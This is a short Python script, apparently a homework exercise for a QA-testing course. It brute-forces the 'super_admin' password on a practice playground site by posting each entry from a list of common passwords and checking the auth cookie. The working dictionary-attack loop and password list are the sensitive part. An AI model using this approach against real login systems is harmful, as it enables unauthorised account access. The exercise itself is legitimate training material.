import requests



url_pass = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url_check_auth = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"


test_table = ['abs']
pass_table = ['password', '123456', '123456789', '12345678', 'Football', 'football', 'baseball', 'qwerty', 'abc123',
'monkey', 'letmein', 'sunshine', 'iloveyou', 'princess', 'dragon', 'trustno1', 'adobe123', 'login', 'admin', 'hottie', 'freedom',
'welcome', 'mustang', 'passw0rd', 'lovely', 'master', 'superman', 'michael', 'shadow', 'access', 'flower', 'starwars', 'photoshop',
'solo', 'uiop', 'ashley', 'bailey', 'hello', 'loveme', 'whatever', 'donald', 'batman', 'zaq1zaq1', 'qazwsx', 'azerty', 'ninja', '123qwe',
'000000', 'password1', 'qwerty123', '123123', 'aa123456', '696969', 'jesus', 'charlie', '888888', '654321', '12345', '123123', '7777777',
'555555', '1234567890', '12345', '1234567', '111111', '1q2w3e4r', '666666', '1234', '1qaz2wsx', '!@#$%^&*', 'qwertyuiop', '121212']

payload = {"login":"super_admin", "password":"null"}
for i in pass_table:
    payload["password"] = i
    get_cookie = requests.post(url_pass, data=payload)
    cookie = dict(get_cookie.cookies)
    check_cookie = requests.get(url_check_auth, cookies=cookie)
    if check_cookie.text == 'You are authorized':
        print("login: super_admin,", "password: "+i)
        break




